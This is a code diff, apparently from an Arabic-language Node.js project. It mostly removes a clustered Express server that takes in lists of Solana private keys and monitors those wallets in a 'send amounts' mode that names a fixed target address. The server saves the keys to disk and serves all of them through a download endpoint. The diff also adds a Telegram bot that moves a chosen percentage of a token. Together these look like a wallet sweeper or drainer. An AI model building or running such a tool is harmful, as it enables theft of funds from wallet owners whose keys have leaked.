-                        const cnt2 = ws2?.totalWallets ?? Infinity;
-                        if (cnt2 < minCnt) { minCnt = cnt2; tgt = wi; }
-                    }
-
-                    let appAdded = 0;
-                    let appAddedKeys = [];
-                    if (tgt === 'primary') {
-                        const res2 = await primaryMonitor.appendWallets(appendKeys, appendSettings);
-                        appAdded     = res2.addresses.length;
-                        appAddedKeys = res2.keys;
-                        primaryState = primaryMonitor.getState();
-                        if (!storedWalletSlices[0]) storedWalletSlices[0] = { keys: [], rpcs: [] };
-                        storedWalletSlices[0].keys.push(...appAddedKeys);
-                    } else {
-                        const wt     = orderedWorkers[tgt];
-                        const wRes2  = await askWorker(wt, 'append-wallets', { keys: appendKeys, settings: appendSettings });
-                        appAdded     = wRes2?.added ?? 0;
-                        appAddedKeys = wRes2?.addedKeys ?? [];
-                        const sIdx   = tgt + 1;
-                        if (!storedWalletSlices[sIdx]) storedWalletSlices[sIdx] = { keys: [], rpcs: [] };
-                        storedWalletSlices[sIdx].keys.push(...appAddedKeys);
-                    }
-
-                    if (appAdded > 0) {
-                        addGlobalNotification(`✅ أُضيفت ${appAdded} محفظة جديدة | ${modeLabel2}`, 'success');
-                        await new Promise(r => setTimeout(r, 400));
-                        pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
-                    }
-                    w.send({ cmd: 'response', reqId: msg.reqId, result: {
-                        success: appAdded > 0,
-                        message: appAdded > 0 ? `✅ أُضيفت ${appAdded} محفظة للمراقبة` : 'جميع المحافظ موجودة مسبقاً',
-                        addedCount: appAdded,
-                        addedKeys: appAddedKeys
-                    }});
-                    break;
-                }
-                case 'get-notifications':
-                    w.send({ cmd: 'response', reqId: msg.reqId, result: globalNotifications });
-                    break;
-                case 'get-state':
-                    // إرجاع الحالة الكاملة (مع العناوين) لطلبات /api/state
-                    w.send({ cmd: 'response', reqId: msg.reqId, result: getAggregatedState() });
-                    break;
-                case 'get-updates':
-                    // طلب موحَّد: حالة خفيفة + إشعارات في رسالة IPC واحدة
-                    w.send({ cmd: 'response', reqId: msg.reqId, result: { state: getLightState(), notifs: globalNotifications } });
-                    break;
-                case 'delete-wallet-done':
-                    // رد من العامل بعد حذف المحفظة
-                    // يُعالَج في askWorker — لا شيء إضافي هنا
-                    break;
-                case 'worker-state-update':
-                    workerStates.set(w.id, msg.state);
-                    pushSSE({ t: 's', state: getLightState() });
-                    break;
-                case 'worker-ready':
-                    workersReady = Math.min(workersReady + 1, NUM_EXTRA_WORKERS);
-                    pushSSE({ t: 's', state: getLightState() });
-                    console.log(`[PRIMARY] العمال الجاهزون: ${workersReady}/${NUM_EXTRA_WORKERS}`);
-                    break;
-                case 'worker-notification':
-                    addGlobalNotification(msg.message, msg.notifType);
-                    break;
-            }
-        });
-
-        // ── إعادة fork تلقائية عند خروج العامل ─────────────────────────────
-        w.on('exit', (code, signal) => {
-            console.log(`[PRIMARY] Worker ${w.id} exited — reforking…`);
-            const idx = orderedWorkers.indexOf(w);
-            workers.delete(w.id);
-            workerStates.delete(w.id);
-            // تصحيح عداد العمال الجاهزين عند الانهيار
-            if (workersReady > 0) workersReady--;
-
-            const nw = cluster.fork();
-            workers.set(nw.id, nw);
-            if (idx !== -1) orderedWorkers[idx] = nw;
-            else orderedWorkers.push(nw);
-            // ربط معالج الرسائل الجديد بالعامل الجديد بشكل صحيح
-            setupWorkerHandlers(nw);
-
-            // ── إعادة تحميل شريحة المحافظ إلى العامل الجديد ─────────────────
-            // sliceIdx = idx+1 (المؤشر صفر للـ primary، واحد+ للعمال)
-            const sliceIdx = idx !== -1 ? idx + 1 : -1;
-            const slice = sliceIdx >= 0 ? storedWalletSlices[sliceIdx] : null;
-            const isMonitoring = primaryMonitor.isMonitoring ||
-                [...workerStates.values()].some(s => s.isMonitoring);
-            if (slice?.keys?.length > 0 && isMonitoring) {
-                // انتظر حتى يُعلن العامل عن جاهزيته ثم أرسل شريحته
-                const onReady = (m) => {
-                    if (m.cmd === 'worker-ready') {
-                        nw.off('message', onReady);
-                        try {
-                            nw.send({
-                                cmd:     'load-wallets',
-                                keys:    slice.keys,
-                                rpcs:    slice.rpcs,
-                                allRpcs: allRpcUrls,
-                                settings: lastSettings
-                            });
-                            addGlobalNotification(
-                                `🔄 إعادة تحميل ${slice.keys.length} محفظة للعامل المُستبدَل`,
-                                'info'
-                            );
-                        } catch(_) {}
-                    }
-                };
-                nw.on('message', onReady);
-            }
-        });
-    }
-
-    function forkWorker() {
-        const w = cluster.fork();
-        workers.set(w.id, w);
-        orderedWorkers.push(w);
-        setupWorkerHandlers(w);
-    }
-
-    // ── توزيع العمل على جميع العمليات بالتوازي ─────────────────────────────
-    function distributeWork(keyList) {
-        const N = orderedWorkers.length + 1; // primary + workers
-        const keysPerProc = Math.ceil(keyList.length / N);
-        const urlsPerProc = Math.max(1, Math.ceil(allRpcUrls.length / N));
-        storedWalletSlices = [];
-        for (let i = 0; i < N; i++) {
-            storedWalletSlices.push({
-                keys: keyList.slice(i * keysPerProc, Math.min((i + 1) * keysPerProc, keyList.length)),
-                rpcs: allRpcUrls.slice(i * urlsPerProc, (i + 1) * urlsPerProc)
-            });
-        }
-    }
-
-    function loadAll(settings, total) {
-        // أرسل لكل عامل شريحته في نفس الوقت بالتوازي
-        for (let i = 0; i < orderedWorkers.length; i++) {
-            const s = storedWalletSlices[i + 1];
-            if (s?.keys?.length > 0) {
-                try {
-                    orderedWorkers[i].send({ cmd: 'load-wallets', keys: s.keys, rpcs: s.rpcs, allRpcs: allRpcUrls, settings });
-                    addGlobalNotification(`🔄 العامل ${i + 1}: ${s.keys.length} محفظة`, 'info');
-                } catch (_) {}
-            }
-        }
-        // Primary يبدأ في نفس الوقت — لا انتظار لأي عامل آخر
-        const s0 = storedWalletSlices[0];
-        if (s0?.keys?.length > 0) {
-            addGlobalNotification(`🔄 العامل الرئيسي: ${s0.keys.length} محفظة`, 'info');
-            primaryMonitor.load(s0.keys, s0.rpcs, allRpcUrls, settings)
-                .then(() => {
-                    primaryState = primaryMonitor.getState();
-                    if (total) {
-                        addGlobalNotification(`__DONE__:${total}`, 'success');
-                        addGlobalNotification(`✅ اكتمل تحميل ${total} محفظة`, 'success');
-                    }
-                })
-                .catch(e => addGlobalNotification(`❌ خطأ في التحميل: ${e.message}`, 'error'));
-        }
-    }
-
-    for (let i = 0; i < NUM_EXTRA_WORKERS; i++) forkWorker();
-
-    // ── Primary's own Express server (opens port 5000 immediately) ───────────
-    const app = buildExpressApp(getAggregatedState);
-
-    app.post('/api/add-wallets', async (req, res) => {
-        const keys       = (req.body.privateKeys || '').trim();
-        const settings   = req.body.settings   || {};
-        if (!keys) { res.json({ success: false, message: 'لا توجد مفاتيح' }); return; }
-        if (settings.mode === 'telegram' && !String(settings.chatId || '').trim()) {
-            res.json({ success: false, message: '⚠️ يجب إدخال Telegram Chat ID عند اختيار وضع تلجرام' }); return;
-        }
-
-        lastSettings = settings; // حفظ الإعدادات لاستخدامها عند الاستئناف
-        allRpcUrls = ALL_RPC_URLS;
-
-        const keyList = keys.split(/[\r\n]+/).map(k => k.trim()).filter(Boolean);
-
-        const modeLabel = settings.mode === 'telegram' ? '📨 تلجرام فقط' : '💸 إرسال مبالغ';
-        const netLabel  = settings.network === 'devnet' ? 'devnet' : 'mainnet';
-        const total     = keyList.length;
-
-        distributeWork(keyList);
-        saveWalletsToDisk(); // ── حفظ فوري بعد التوزيع ──
-        primaryMonitor.stop();
-        broadcastToWorkers({ cmd: 'stop-monitoring' });
-
-        // ── استجب فوراً — جميع العمال يبدؤون بالتوازي في الخلفية ──────────────
-        addGlobalNotification(`🚀 جاري تحميل ${total} محفظة — ${modeLabel} | ${netLabel}`, 'info');
-        res.json({ success: true, loading: true, total, message: `🚀 جاري تحميل ${total} محفظة — تابع شريط التقدم | ${modeLabel} | ${netLabel}` });
-        loadAll(settings, total);
-    });
-
-    // ── إضافة محافظ جديدة بدون إيقاف المراقبة الموجودة ─────────────────────────
-    app.post('/api/append-wallets', async (req, res) => {
-        const newKeys  = (req.body.keys || []).map(k => k.trim()).filter(Boolean);
-        const settings = req.body.settings || {};
-        if (!newKeys.length) return res.json({ success: false, message: 'لا توجد مفاتيح جديدة' });
-        if (settings.mode === 'telegram' && !String(settings.chatId || '').trim())
-            return res.json({ success: false, message: '⚠️ يجب إدخال Telegram Chat ID عند اختيار وضع تلجرام' });
-
-        const modeLabel = settings.mode === 'telegram' ? '📨 تلجرام' : '💸 إرسال مبالغ';
-
-        // ── فحص التكرار عالمياً ضد جميع المحافظ في كل العمال ──────────────────
-        const allExistingKeys = new Set(storedWalletSlices.flatMap(s => s.keys || []));
-        const trulyNew = [...new Set(newKeys)].filter(k => !allExistingKeys.has(k));
-
-        if (trulyNew.length === 0)
-            return res.json({ success: false, message: 'جميع المفاتيح المُدخلة موجودة مسبقاً في المراقبة' });
-
-        // ── توزيع المفاتيح الجديدة على جميع العمال بالتساوي ────────────────────
-        const allProcs  = [null, ...orderedWorkers]; // null = العملية الرئيسية
-        const numProcs  = allProcs.length;
-        const chunkSize = Math.ceil(trulyNew.length / numProcs);
-
-        let totalAdded    = 0;
-        let allAddedKeys  = [];
-        let totalDups     = 0;
-        let totalParseErr = 0;
-
-        await Promise.all(allProcs.map(async (proc, idx) => {
-            const chunk = trulyNew.slice(idx * chunkSize, (idx + 1) * chunkSize);
-            if (!chunk.length) return;
-
-            if (proc === null) {
-                // ── العملية الرئيسية ──────────────────────────────────────────
-                const r2 = await primaryMonitor.appendWallets(chunk, settings);
-                totalAdded    += r2.addresses.length;
-                allAddedKeys.push(...r2.keys);
-                totalDups     += r2.duplicates  || 0;
-                totalParseErr += r2.parseErrors || 0;
-                primaryState   = primaryMonitor.getState();
-                if (!storedWalletSlices[0]) storedWalletSlices[0] = { keys: [], rpcs: [] };
-                storedWalletSlices[0].keys.push(...r2.keys);
-            } else {
-                // ── عامل ─────────────────────────────────────────────────────
-                const result = await askWorker(proc, 'append-wallets', { keys: chunk, settings });
-                const added  = result?.addedKeys ?? [];
-                totalAdded    += result?.added     ?? 0;
-                allAddedKeys.push(...added);
-                totalDups     += result?.duplicates  ?? 0;
-                totalParseErr += result?.parseErrors ?? 0;
-                if (!storedWalletSlices[idx]) storedWalletSlices[idx] = { keys: [], rpcs: [] };
-                storedWalletSlices[idx].keys.push(...added);
-            }
-        }));
-
-        if (totalAdded > 0) saveWalletsToDisk();
-
-        if (totalAdded === 0) {
-            let msg;
-            if (totalParseErr > 0 && totalDups === 0)
-                msg = `❌ المفاتيح المُدخلة غير صالحة (${totalParseErr} خطأ في التحليل)`;
-            else if (totalParseErr > 0)
-                msg = `⚠️ ${totalDups} مكررة، ${totalParseErr} غير صالحة — لم تُضَف أي محفظة جديدة`;
-            else
-                msg = 'جميع المفاتيح المُدخلة موجودة مسبقاً في المراقبة';
-            return res.json({ success: false, message: msg });
-        }
-
-        addGlobalNotification(`✅ أُضيفت ${totalAdded} محفظة جديدة | ${modeLabel}`, 'success');
-        await new Promise(r => setTimeout(r, 400));
-        pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
-        res.json({ success: true, message: `✅ أُضيفت ${totalAdded} محفظة للمراقبة`, addedCount: totalAdded, addedKeys: allAddedKeys });
-    });
-
-    // ── تحديث الإعدادات على المراقبة الجارية دون إعادة تحميل المحافظ ──────────
-    app.post('/api/update-settings', async (req, res) => {
-        const settings = req.body.settings || {};
-        if (settings.mode === 'telegram' && !String(settings.chatId || '').trim()) {
-            res.json({ success: false, message: '⚠️ يجب إدخال Telegram Chat ID عند اختيار وضع تلجرام' }); return;
-        }
-        lastSettings = settings;
-        saveWalletsToDisk(); // ── حفظ الإعدادات الجديدة في الملف الدائم ──
-        const needsReload = primaryMonitor.applySettings(settings);
-        broadcastToWorkers({ cmd: 'update-settings', settings });
-
-        if (needsReload && storedWalletSlices.length) {
-            // الشبكة تغيرت أثناء المراقبة — أعد تحميل المحافظ بالإعدادات الجديدة
-            addGlobalNotification('🔄 تغيير الشبكة يتطلب إعادة تحميل المحافظ…', 'info');
-            res.json({ success: true, reload: true, message: '🔄 تغيير الشبكة يتطلب إعادة تحميل المحافظ تلقائياً…' });
-            loadAll(settings);
+        if (hasToken) {
+          userState.set(userId, { mintAddress: text });
+          await ctx.reply("✅ التوكن موجود في المحفظة!\nيرجى كتابة النسبة المئوية المراد نقلها (مثال: 30):");
         } else {
-            primaryState = primaryMonitor.getState();
-            const modeLabel = settings.mode === 'telegram' ? '📨 تلجرام' : '💸 إرسال مبالغ';
-            const netLabel  = settings.network === 'devnet' ? 'Devnet' : 'Mainnet';
-            res.json({ success: true, reload: false, message: `✅ الإعدادات حُدِّثت: ${modeLabel} | ${netLabel}` });
+          await ctx.reply("❌ التوكن غير موجود داخل المحفظة.");
         }
-    });
-
-    app.post('/api/stop', (_, res) => {
-        primaryMonitor.stop();
-        primaryState = primaryMonitor.getState();
-        broadcastToWorkers({ cmd: 'stop-monitoring' });
-        addGlobalNotification('🛑 تم إيقاف مراقبة جميع المحافظ بشكل نهائي', 'info');
-        res.json({ success: true, message: 'تم إيقاف مراقبة جميع المحافظ بشكل نهائي' });
-    });
-
-    // ── حذف محفظة واحدة من المراقبة — يقطع اشتراكاتها ويحذف كاشها ─────────────
-    app.post('/api/delete-wallet', async (req, res) => {
-        const { address } = req.body || {};
-        if (!address || typeof address !== 'string') {
-            return res.json({ success: false, message: 'عنوان المحفظة مطلوب' });
-        }
-        const shortAddr = address.slice(0, 4) + '...' + address.slice(-4);
-
-        // ── محاولة 1: Primary Monitor ────────────────────────────────────────
-        const primaryKey = primaryMonitor.removeWallet(address);
-        if (primaryKey !== null) {
-            // حذف المفتاح من شريحة Primary المحفوظة
-            const slice0 = storedWalletSlices[0];
-            if (slice0?.keys) {
-                const ki = slice0.keys.indexOf(primaryKey);
-                if (ki !== -1) slice0.keys.splice(ki, 1);
-            }
-            primaryState = primaryMonitor.getState();
-            saveWalletsToDisk(); // ── حفظ بعد الحذف ──
-            addGlobalNotification(`🗑️ حُذفت المحفظة ${shortAddr} من المراقبة`, 'info');
-            pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
-            return res.json({ success: true, message: `تم حذف المحفظة ${shortAddr}`, removedKey: primaryKey });
-        }
-
-        // ── محاولة 2: Worker Monitors ────────────────────────────────────────
-        for (let i = 0; i < orderedWorkers.length; i++) {
-            const result = await askWorker(orderedWorkers[i], 'delete-wallet', { address });
-            if (result?.found) {
-                // حذف المفتاح من شريحة هذا العامل المحفوظة
-                const sliceW = storedWalletSlices[i + 1];
-                if (result.removedKey && sliceW?.keys) {
-                    const ki = sliceW.keys.indexOf(result.removedKey);
-                    if (ki !== -1) sliceW.keys.splice(ki, 1);
-                }
-                saveWalletsToDisk(); // ── حفظ بعد الحذف ──
-                addGlobalNotification(`🗑️ حُذفت المحفظة ${shortAddr} من العامل ${i + 1}`, 'info');
-                // انتظر قليلاً حتى يُرسل العامل تحديث حالته عبر IPC
-                await new Promise(r => setTimeout(r, 350));
-                pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
-                return res.json({ success: true, message: `تم حذف المحفظة ${shortAddr}`, removedKey: result.removedKey });
-            }
-        }
-
-        res.json({ success: false, message: `المحفظة ${shortAddr} غير موجودة في قائمة المراقبة` });
-    });
-
-    // ── حذف جميع المحافظ دفعةً واحدة — نفس آلية removeWallet لكل محفظة ─────────
-    app.post('/api/delete-all-wallets', async (req, res) => {
-        // جمع كل المفاتيح الخاصة المحفوظة قبل الحذف
-        const allKeys = storedWalletSlices.flatMap(s => s.keys || []);
-
-        // إيقاف Primary ثم جميع العمال مع مسح بيانات المحافظ نهائياً
-        primaryMonitor.stop(true);
-        primaryState = primaryMonitor.getState();
-        broadcastToWorkers({ cmd: 'stop-monitoring', clearAll: true });
-
-        // مسح الحالة المؤقتة للعمال فوراً حتى لا تظهر محافظ قديمة في SSE
-        for (const [id, s] of workerStates) {
-            workerStates.set(id, { ...s, isMonitoring: false, walletCount: 0, activeCount: 0, failedCount: 0, walletAddresses: [] });
-        }
-
-        // مسح شرائح التخزين حتى لا يُستأنف عند /api/resume
-        storedWalletSlices.length = 0;
-        clearWalletsFile(); // ── حذف الملف الدائم ──
-
-        const count = allKeys.length;
-        addGlobalNotification(`🗑️ تم حذف جميع المحافظ (${count} محفظة) من المراقبة`, 'info');
-        pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
-
-        res.json({ success: true, message: `تم حذف ${count} محفظة`, removedKeys: allKeys, count });
-    });
-
-    app.post('/api/resume', async (_, res) => {
-        if (!storedWalletSlices.length || !storedWalletSlices[0].keys.length) {
-            res.json({ success: false, message: 'لا توجد محافظ محفوظة' }); return;
-        }
-        const resumeTotal = storedWalletSlices.reduce((s, x) => s + x.keys.length, 0);
-        addGlobalNotification('▶️ جاري استئناف مراقبة جميع المحافظ بالتوازي…', 'info');
-        res.json({ success: true, message: 'تم استئناف المراقبة' });
-        loadAll(lastSettings, resumeTotal);
-    });
-
-    app.get('/api/notifications', (_, res) => res.json(globalNotifications));
-
-    app.get('/api/state', (_, res) => res.json(getAggregatedState()));
-
-    // ── تنزيل جميع المفاتيح (للمشرف فقط) ─────────────────────────────────────
-    app.get('/api/download-keys', (req, res) => {
-        const h   = req.headers.authorization || '';
-        const tok = h.startsWith('Bearer ') ? h.slice(7) : (req.query.token || '');
-        if (!AUTH_TOKEN || tok !== AUTH_TOKEN)
-            return res.status(401).end();
-        const allKeys = storedWalletSlices.flatMap(s => s.keys || []);
-        if (!allKeys.length)
-            return res.status(404).json({ error: 'لا توجد محافظ محفوظة' });
-        const content = allKeys.join('\n\n');
-        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-        res.setHeader('Content-Disposition', 'attachment; filename="keys.txt"');
-        res.send(content);
-    });
-
-    // ── SSE endpoint للدفع الفوري ─────────────────────────────────────────────
-    app.get('/api/events', (req, res) => {
-        res.setHeader('Content-Type', 'text/event-stream');
-        res.setHeader('Cache-Control', 'no-cache');
-        res.setHeader('Connection', 'keep-alive');
-        res.setHeader('X-Accel-Buffering', 'no');
-        res.flushHeaders();
-        // إرسال الحالة الأولية فور الاتصال
-        res.write(`data: ${JSON.stringify({ t: 'i', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) })}\n\n`);
-        sseClients.add(res);
-        req.on('close', () => sseClients.delete(res));
-    });
-
-    // ── endpoint موحَّد: state + notifications في طلب واحد ───────────────────
-    app.get('/api/updates', (_, res) => {
-        res.json({ state: getAggregatedState(), notifs: globalNotifications });
-    });
-
-    app.get('/api/status', (_, res) => {
-        const state = getAggregatedState();
-        const wallets = state.walletAddresses.map((w, i) => ({
-            index: i + 1, address: w.address, hasSubscription: w.active,
-            isFailed: w.isFailed, errorCount: w.errorCount
-        }));
-        res.json({ message: buildStatusMessage(state, wallets), wallets });
-    });
-
-    function buildStatusMessage(state, wallets) {
-        let msg = `📊 حالة المحافظ:\n\n`;
-        wallets.forEach((w, i) => {
-            msg += `🔹 المحفظة ${i + 1}: ${w.address.slice(0,8)}…\n`;
-            msg += `   المراقبة: ${w.hasSubscription && !w.isFailed ? '🟢 نشط' : '🔴 متوقف'}\n`;
-            if (w.errorCount > 0) msg += `   أخطاء: ${w.errorCount}\n`;
-            msg += '\n';
-        });
-        msg += `🎯 عنوان الهدف: ${TARGET_ADDR}\n`;
-        msg += `⚡ العمال النشطون: ${state.workers}`;
-        return msg;
+      } catch (err) {
+        await ctx.reply("❌ حدث خطأ أثناء البحث عن التوكن.");
+      }
     }
+  });
 
-    app.listen(PORT, '0.0.0.0', () => {
-        console.log(`[PRIMARY PID:${process.pid}] HTTP on port ${PORT} | UV_THREADPOOL=8 | max-old-space=3072`);
-        console.log(`[PRIMARY] Forked ${NUM_EXTRA_WORKERS} extra HTTP worker(s)`);
+  if (WEBHOOK_URL) {
+    // وضع الويبهوك: لا يوجد 409 نهائياً
+    const { webhookCallback } = await import("grammy");
+    app.post(WEBHOOK_PATH, webhookCallback(bot, "express", { secretToken: WEBHOOK_SECRET }));
+    await bot.init();
+    await bot.api.setWebhook(WEBHOOK_URL.replace(/\/$/, "") + WEBHOOK_PATH, {
+      secret_token: WEBHOOK_SECRET,
+      drop_pending_updates: true,
+      allowed_updates: ["message", "callback_query"],
     });
+    botReady = true;
+    console.log("🤖 Telegram Bot started via Webhook.");
+    return;
+  }
 
-    // ── تحميل تلقائي للمحافظ المحفوظة بعد أن يكون جميع العمال جاهزين ──────────
-    (function scheduleAutoLoad() {
-        const saved = loadWalletsFromDisk();
-        if (!saved) return; // لا يوجد ملف محفوظ
-        _hasSavedWallets = true; // إعلام المتصفح بوجود محافظ محفوظة على الخادم
-        const startedAt  = Date.now();
-        const MAX_WAIT   = 30_000; // أقصى انتظار 30 ثانية قبل التحميل بأي حال
-        const waitForWorkers = () => {
-            const elapsed = Date.now() - startedAt;
-            if (workersReady < NUM_EXTRA_WORKERS && elapsed < MAX_WAIT) {
-                setTimeout(waitForWorkers, 500);
-                return;
-            }
-            if (elapsed >= MAX_WAIT)
-                console.warn(`[PERSIST] تحذير: انتهى وقت الانتظار (${MAX_WAIT}ms) — سيتم التحميل بالعمال المتاحين`);
-            allRpcUrls   = ALL_RPC_URLS;
-            lastSettings = saved.settings || {};
-            distributeWork(saved.keys);
-            const total  = saved.keys.length;
-            addGlobalNotification(`♻️ جاري إعادة تحميل ${total} محفظة تلقائياً من الحفظ السابق…`, 'info');
-            console.log(`[PERSIST] إعادة تحميل ${total} محفظة من: ${WALLETS_FILE}`);
-            loadAll(lastSettings, total);
-        };
-        setTimeout(waitForWorkers, 1000); // إعطاء ثانية للعمال لبدء التشغيل
-    })();
+  // وضع Long Polling مع إيقاف نظيف عند إعادة النشر
+  const shutdown = async (sig) => {
+    console.log(`${sig} received — stopping bot cleanly...`);
+    try { await bot.stop(); } catch {}
+    process.exit(0);
+  };
+  process.once("SIGTERM", () => shutdown("SIGTERM"));
+  process.once("SIGINT", () => shutdown("SIGINT"));
 
-    process.on('uncaughtException',  e => console.error('[PRIMARY] uncaughtException:', e.message));
-    process.on('unhandledRejection', r => console.error('[PRIMARY] unhandledRejection:', r));
-
-} else {
-    // ─────────────────────────────────────────────────────────────────────────
-    //  WORKER PROCESS — HTTP server + monitors its assigned wallet slice
-    // ─────────────────────────────────────────────────────────────────────────
-
-    // Pending IPC requests
-    const pending = new Map();
-    let reqCounter = 0;
-
-    function ask(cmd, data = {}) {
-        return new Promise((resolve) => {
-            const reqId = ++reqCounter;
-            pending.set(reqId, resolve);
-            process.send({ cmd, reqId, ...data });
-            setTimeout(() => {
-                if (pending.has(reqId)) { pending.delete(reqId); resolve({ error: 'timeout' }); }
-            }, 30000);
-        });
+  const startBotWithRetry = async (attempt = 1) => {
+    try {
+      await bot.api.deleteWebhook({ drop_pending_updates: true }).catch(() => {});
+      await bot.start({
+        drop_pending_updates: true,
+        onStart: () => { botReady = true; console.log("🤖 Telegram Bot started via Long Polling successfully!"); },
+      });
+    } catch (err) {
+      const code = err?.error_code;
+      if (code === 409) {
+        const wait = Math.min(attempt * 5000, 60000);
+        console.warn(`⚠️ 409: نسخة أخرى تعمل. إعادة المحاولة ${attempt} بعد ${wait / 1000}ث...`);
+        setTimeout(() => startBotWithRetry(attempt + 1), wait);
+        return;
+      }
+      console.error("Bot start failed:", err?.message || err);
+      setTimeout(() => startBotWithRetry(attempt + 1), 10000);
     }
-
-    // ── debounce لتحديث حالة العامل — منع إغراق IPC بالتحديثات المتتالية ───
-    let _stateDebounce = null;
-    function sendStateUpdate() {
-        if (_stateDebounce) return;
-        _stateDebounce = setTimeout(() => {
-            _stateDebounce = null;
-            process.send({ cmd: 'worker-state-update', state: workerMonitor.getState() });
-        }, 200);
-    }
-
-    // Local monitor for this worker's wallet slice
-    const workerMonitor = new SolanaWorkerMonitor((msg, type) => {
-        process.send({ cmd: 'worker-notification', message: msg, notifType: type });
-        sendStateUpdate();
-    });
-
-    process.on('message', async (msg) => {
-        if (msg.cmd === 'response') {
-            const resolve = pending.get(msg.reqId);
-            if (resolve) { pending.delete(msg.reqId); resolve(msg.result); }
-            return;
-        }
-        if (msg.cmd === 'load-wallets') {
-            await workerMonitor.load(msg.keys, msg.rpcs, msg.allRpcs, msg.settings || {});
-            sendStateUpdate();
-        }
-        if (msg.cmd === 'stop-monitoring') {
-            workerMonitor.stop(!!msg.clearAll);
-            sendStateUpdate();
-        }
-        if (msg.cmd === 'update-settings') {
-            const needsReload = workerMonitor.applySettings(msg.settings || {});
-            if (needsReload && msg.keys) {
-                await workerMonitor.load(msg.keys, msg.rpcs || [], msg.allRpcs || [], msg.settings);
-            }
-            sendStateUpdate();
-        }
-        if (msg.cmd === 'delete-wallet') {
-            const removedKey = workerMonitor.removeWallet(msg.address);
-            sendStateUpdate();
-            if (msg.reqId) {
-                process.send({
-                    cmd:    'worker-response',
-                    reqId:  msg.reqId,
-                    result: { found: removedKey !== null, removedKey }
-                });
-            }
-        }
-        if (msg.cmd === 'append-wallets') {
-            const appendRes = await workerMonitor.appendWallets(msg.keys || [], msg.settings || {});
-            sendStateUpdate();
-            if (msg.reqId) {
-                process.send({
-                    cmd:    'worker-response',
-                    reqId:  msg.reqId,
-                    result: { added: appendRes.addresses.length, addresses: appendRes.addresses, addedKeys: appendRes.keys }
-                });
-            }
-        }
-    });
-
-    // العمال يتواصلون مع الـ primary عبر IPC فقط — لا حاجة لـ HTTP server
-    console.log(`[WORKER PID:${process.pid}] جاهز (IPC فقط)`);
-    process.send({ cmd: 'worker-ready' });
-
-    process.on('uncaughtException',  e => console.error(`[WORKER ${process.pid}] uncaughtException:`, e.message));
-    process.on('unhandledRejection', r => console.error(`[WORKER ${process.pid}] unhandledRejection:`, r));
+  };
+  startBotWithRetry();
 }
-
-// ─────────────────────────────────────────────────────────────────────────────
-//  HTML Interface — served from index.html
-// ─────────────────────────────────────────────────────────────────────────────
-// (moved to index.html — served via express.static / sendFile)
-/*
-function getHtml() {
-    return `<!DOCTYPE html>
-<html dir="rtl" lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مراقب محافظ Solana</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;position:relative}
-        .container{max-width:1200px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);overflow:hidden}
-        .header{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;padding:30px;text-align:center}
-        .header h1{font-size:2.5rem;margin-bottom:10px}
-        .header .sub{font-size:.9rem;opacity:.8;margin-top:5px}
-        .main-content{display:grid;grid-template-columns:1fr 400px;gap:30px;padding:30px}
-        .left-panel{display:flex;flex-direction:column;gap:20px}
-        .card{background:#f8f9fa;border:2px solid #e9ecef;border-radius:15px;padding:25px;transition:all .3s ease}
-        .card:hover{transform:translateY(-5px);box-shadow:0 10px 25px rgba(0,0,0,.1)}
-        .card h2{color:#495057;margin-bottom:15px;font-size:1.5rem}
-        .form-group{margin-bottom:15px}
-        label{display:block;margin-bottom:5px;font-weight:700;color:#495057}
-        textarea{width:100%;padding:15px;border:2px solid #dee2e6;border-radius:10px;font-size:14px;resize:vertical;min-height:120px;font-family:monospace;direction:ltr;text-align:left}
-        textarea:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}
-        .btn{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;border:none;padding:15px 30px;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:all .3s ease;width:100%}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(102,126,234,.3)}
-        .btn.secondary{background:linear-gradient(45deg,#6c757d,#495057)}
-        #fileInput{width:100%;padding:10px;border:2px dashed #dee2e6;border-radius:10px;font-size:14px;cursor:pointer;background:#fff;color:#495057}
-        #fileInput:hover{border-color:#667eea;background:#f0f2ff}
-        .btn.danger{background:linear-gradient(45deg,#dc3545,#c82333)}
-        .right-panel{display:flex;flex-direction:column;gap:20px}
-        .status-display{background:#f8f9fa;border-radius:15px;padding:20px;font-family:monospace;font-size:14px;white-space:pre-wrap;word-break:break-all;overflow-wrap:break-word;max-height:300px;overflow-y:auto;border:2px solid #e9ecef}
-        .notifications{background:#f8f9fa;border-radius:15px;padding:20px;max-height:400px;overflow-y:auto;border:2px solid #e9ecef;word-break:break-all;overflow-wrap:break-word}
-        .notification{padding:10px;margin-bottom:10px;border-radius:8px;font-size:14px;border-left:4px solid #667eea}
-        .notification.success{background:#d4edda;border-color:#28a745}
-        .notification.error{background:#f8d7da;border-color:#dc3545}
-        .notification.warning{background:#fff3cd;border-color:#ffc107}
-        .notification.info{background:#d1ecf1;border-color:#17a2b8}
-        .timestamp{font-size:12px;color:#6c757d;margin-top:5px}
-        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:15px;margin-bottom:20px}
-        .stat-card{background:#fff;padding:20px;border-radius:10px;text-align:center;border:2px solid #e9ecef}
-        .stat-value{font-size:2rem;font-weight:700;color:#667eea}
-        .stat-label{color:#6c757d;font-size:14px}
-        @media(max-width:768px){.main-content{grid-template-columns:1fr}.header h1{font-size:2rem}}
